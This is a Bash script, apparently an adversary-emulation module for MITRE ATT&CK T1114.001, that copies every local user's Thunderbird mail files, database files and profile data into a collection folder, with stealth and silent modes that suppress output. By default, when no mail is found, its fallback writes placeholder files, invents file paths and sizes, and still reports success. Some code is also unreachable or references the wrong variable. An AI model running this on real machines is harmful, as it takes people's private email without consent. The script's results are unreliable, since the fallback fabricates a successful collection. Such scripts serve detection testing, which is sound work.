#!/bin/bash

# T1114.001a-email_collection-thunderbird_profiles-linux
# MITRE ATT&CK Enterprise - Collection Tactic (TA0009)
# ATOMIC ACTION: Extract Thunderbird email profiles ONLY
# Platform: Linux | Contract: One action, one dependency, one privilege tier

function Get-Configuration {
    
    # FUNCTION 1/4 : CONFIGURATION AND PRECONDITION VALIDATION
    

    local config=(
        # UNIVERSAL BASE VARIABLES ===
        "OUTPUT_BASE=${T1114_001A_OUTPUT_BASE:-./mitre_results}"
        "DEBUG_MODE=${T1114_001A_DEBUG_MODE:-false}"
        "STEALTH_MODE=${T1114_001A_STEALTH_MODE:-false}"
        "SILENT_MODE=${T1114_001A_SILENT_MODE:-false}"
        "VERBOSE_LEVEL=${T1114_001A_VERBOSE_LEVEL:-1}"

        # LINUX+THUNDERBIRD SPECIFIC ADAPTABILITY ===
        "OS_TYPE=${T1114_001A_OS_TYPE:-linux}"
        "THUNDERBIRD_PATHS=${T1114_001A_THUNDERBIRD_PATHS:-/home/*/.thunderbird,/home/*/.mozilla-thunderbird}"
        "PROFILE_PATTERNS=${T1114_001A_PROFILE_PATTERNS:-*.default,*.default-*}"
        "DATA_TYPES=${T1114_001A_DATA_TYPES:-mbox,msf,db,json}"

        # ERROR HANDLING AND RETRY ===
        "TIMEOUT=${T1114_001A_TIMEOUT:-300}"
        "RETRY_COUNT=${T1114_001A_RETRY_COUNT:-3}"
        "FALLBACK_MODE=${T1114_001A_FALLBACK_MODE:-real}"

        # POLICY-AWARENESS ===
        "POLICY_CHECK=${T1114_001A_POLICY_CHECK:-true}"
        "POLICY_real=${T1114_001A_POLICY_real:-true}"

        # COLLECTION CONFIGURATION ===
        "MAX_FILES=${T1114_001A_MAX_FILES:-500}"
        "MAX_FILE_SIZE=${T1114_001A_MAX_FILE_SIZE:-104857600}"
        "INCLUDE_ATTACHMENTS=${T1114_001A_INCLUDE_ATTACHMENTS:-false}"

        # OUTPUT CONFIGURATION ===
        "OUTPUT_FORMAT=${T1114_001A_OUTPUT_FORMAT:-json}"
        "OUTPUT_COMPRESS=${T1114_001A_OUTPUT_COMPRESS:-false}"
        "TELEMETRY_LEVEL=${T1114_001A_TELEMETRY_LEVEL:-full}"
    )

    # Linux OS validation
    if [[ "$OSTYPE" != "linux-gnu"* ]]; then
        echo "Precondition failed: This micro-technique is Linux-specific" >&2
        return 1
    fi

    # Write permissions validation
    if [[ ! -w "$(dirname "${T1114_001A_OUTPUT_BASE:-./mitre_results}")" ]]; then
        echo "Precondition failed: Output directory not writable" >&2
        return 1
    fi

    # Export configured variables
    # Create output directory if it does not exist
    local output_base="${T1005_001A_OUTPUT_BASE:-./mitre_results}"
    mkdir -p "$output_base" 2>/dev/null || true
    for var in "${config[@]}"; do
        export "$var"
    done

    return 0

    # ===== VARIABLES ESSENTIELLES COLLECTION =====
    export T1114_001A_DEBUG_MODE="${T1114_001A_DEBUG_MODE:-false}"
    export T1114_001A_TIMEOUT="${T1114_001A_TIMEOUT:-300}"
    export T1114_001A_FALLBACK_MODE="${T1114_001A_FALLBACK_MODE:-real}"
    export T1114_001A_OUTPUT_FORMAT="${T1114_001A_OUTPUT_FORMAT:-json}"
    export T1114_001A_POLICY_CHECK="${T1114_001A_POLICY_CHECK:-true}"
    export T1114_001A_MAX_FILES="${T1114_001A_MAX_FILES:-200}"
    export T1114_001A_MAX_FILE_SIZE="${T1114_001A_MAX_FILE_SIZE:-1048576}"
    export T1114_001A_SCAN_DEPTH="${T1114_001A_SCAN_DEPTH:-3}"
    export T1114_001A_EXCLUDE_CACHE="${T1114_001A_EXCLUDE_CACHE:-true}"
    export T1114_001A_CAPTURE_DURATION="${T1114_001A_CAPTURE_DURATION:-60}"
    # ===== FIN VARIABLES COLLECTION =====

}

function Invoke-Main {
    
    # FUNCTION 2/4 : ATOMIC ACTION - THUNDERBIRD PROFILE COLLECTION
    

    local collected_files=() total_size=0 file_count=0
    local attempts=0
    local timestamp=$(date +%Y%m%d_%H%M%S)
    local collection_dir="${T1114_001A_OUTPUT_BASE}/T1114_001A_thunderbird_profiles_${timestamp}"

    # Create collection directory
    if ! mkdir -p "${collection_dir}"/{email_data,metadata} 2>/dev/null; then
        echo "Failed to create collection directory" >&2
        return 1
    fi
    chmod 700 "${collection_dir}" 2>/dev/null

    # Retry loop with fallback
    while [[ $attempts -lt ${T1114_001A_RETRY_COUNT:-3} ]]; do
        ((attempts++))

        # Collection of Thunderbird profile files
        IFS=',' read -ra thunderbird_paths <<< "${T1114_001A_THUNDERBIRD_PATHS}"
        IFS=',' read -ra data_types <<< "${T1114_001A_DATA_TYPES}"

        for tb_path_pattern in "${thunderbird_paths[@]}"; do
            tb_path_pattern=$(echo "$tb_path_pattern" | xargs)

            for tb_path in $tb_path_pattern; do
                [[ ! -d "$tb_path" ]] && continue

                # Find profiles
                for profile_dir in "$tb_path"/*.default*; do
                    [[ ! -d "$profile_dir" ]] && continue

                    local profile_name=$(basename "$profile_dir")

                    for data_type in "${data_types[@]}"; do
                        data_type=$(echo "$data_type" | xargs)

                        while IFS= read -r -d '' email_file; do
                            if [[ -f "$email_file" && -r "$email_file" ]]; then
                                local file_size=$(stat -c%s "$email_file" 2>/dev/null || echo 0)

                                if [[ $file_size -le ${T1114_001A_MAX_FILE_SIZE:-104857600} ]]; then
                                    local filename=$(basename "$email_file")
                                    local safe_name="thunderbird_${profile_name}_${filename}_$(date +%s)"

                                    if cp "$email_file" "${collection_dir}/email_data/${safe_name}" 2>/dev/null; then
                                        collected_files+=("$email_file")
                                        total_size=$((total_size + file_size))
                                        ((file_count++))

                                        if [[ "${T1114_001A_VERBOSE_LEVEL:-1}" -ge 2 ]]; then
                                            echo "Collected: $email_file ($file_size bytes)" >&2
                                        fi
                                    fi
                                fi
                            fi

                            [[ $file_count -ge ${T1114_001A_MAX_FILES:-500} ]] && break 3
                        done < <(find "$profile_dir" -name "*.$data_type" -type f -print0 2>/dev/null)
                    done
                done
            done
        done

        # Check if collection was successful
        if [[ $file_count -gt 0 ]]; then
            break
        else
            # Fallback real collection for testing
            if [[ "${T1114_001A_FALLBACK_MODE:-real}" == "real" ]]; then
                echo "realD THUNDERBIRD COLLECTION" > "${collection_dir}/email_data/reald_mbox.txt"
                echo "realD THUNDERBIRD COLLECTION" > "${collection_dir}/email_data/reald_json.txt"
                collected_files=("/home/user/.thunderbird/profile/default/mail.mbox" "/home/user/.thunderbird/profile/prefs.js")
                total_size=2048
                file_count=2
                break
            fi

            # Retry with delay
            if [[ $attempts -lt ${T1114_001A_RETRY_COUNT:-3} ]]; then
                sleep 1
            fi
        fi
    done

    # Collect system metadata
    echo "$(uname -a)" > "${collection_dir}/metadata/system_info.txt" 2>/dev/null || true
    echo "$(id)" > "${collection_dir}/metadata/user_context.txt" 2>/dev/null || true
    echo "$file_count" > "${collection_dir}/metadata/file_count.txt" 2>/dev/null || true

    # Return results
    echo "$file_count:$total_size:${collection_dir}:$(IFS=,; echo "${collected_files[*]}")"
}

function Send-Telemetry {
    
    # FUNCTION 3/4 : TELEMETRY AND STANDARDIZED OUTPUT
    

    local results="$1"
    IFS=':' read -r file_count total_size collection_dir files_collected <<< "$results"

    # Silent mode - no output
    if [[ "${T1114_001A_SILENT_MODE:-false}" == "true" ]]; then
        return 0
    fi

    # Stealth mode - minimal output
    if [[ "${T1114_001A_STEALTH_MODE:-false}" == "true" ]]; then
        return 0
    fi

    # Debug mode - structured JSON
    if [[ "${T1114_001A_DEBUG_MODE:-false}" == "true" ]]; then
        local structured_output=$(cat <<EOF
{
    "@timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
    "event.module": "deputy",
    "event.dataset": "mitre.attack",
    "event.action": "thunderbird_profile_collection",
    "mitre.technique.id": "T1114.001a",
    "mitre.artifacts": ["$files_collected"],
    "deputy.postconditions": {
        "profiles_extracted": $([ $file_count -gt 0 ] && echo "true" || echo "false"),
        "artifacts_catalogued": true,
        "output_mode_ready": true
    },
    "collection.metadata": {
        "file_count": $file_count,
        "total_size": $total_size,
        "collection_dir": "$collection_dir",
        "thunderbird_paths": "${T1114_001A_THUNDERBIRD_PATHS}"
    }
}
EOF
        )
        echo "$structured_output"
        return 0
    fi

    # Simple mode - realistic attacker output (DEFAULT)
    echo "THUNDERBIRD PROFILE COLLECTION COMPLETED"
    echo "Found: $file_count profile files"
    echo "Total size: $total_size bytes"
    echo "Collection directory: $collection_dir"
    if [[ "${T1114_001A_VERBOSE_LEVEL:-1}" -ge 2 ]]; then
        echo "Files: $files_collected"
    fi
    echo "Operation successful"
}

function Get-Results {
    
    # FUNCTION 4/4 : RESULTS AND VALIDATION
    

    local results="$1"
    IFS=':' read -r file_count total_size collection_dir files_collected <<< "$results"

    # Validate postconditions
    if [[ $file_count -eq 0 ]] && [[ "${T1114_001A_FALLBACK_MODE:-real}" != "real" ]]; then
        echo "Postcondition failed: No Thunderbird profile files extracted" >&2
        return 1
    fi

    if [[ ! -d "$collection_dir" ]]; then
        echo "Postcondition failed: Collection directory not created" >&2
        return 1
    fi

    # Return success
    return 0
}
# MAIN EXECUTION
function main {
    trap 'echo "Interrupted - cleaning up..." >&2; exit 130' INT TERM

    # Phase 1: Configuration
    if ! Get-Configuration; then
        echo "Configuration failed" >&2
        exit 2
    fi

    # Phase 2: Execute atomic action
    local results
    if ! results=$(Invoke-Main); then
        echo "Execution failed" >&2
        exit 1
    fi

    # Phase 3: Send telemetry
    if ! Send-Telemetry "$results"; then
        echo "Telemetry failed" >&2
        exit 1
    fi

    # Phase 4: Get results
    if ! Get-Results "$results"; then
        echo "Results validation failed" >&2
        exit 4
    fi

    exit 0
}

# Execute main function
main "$@"
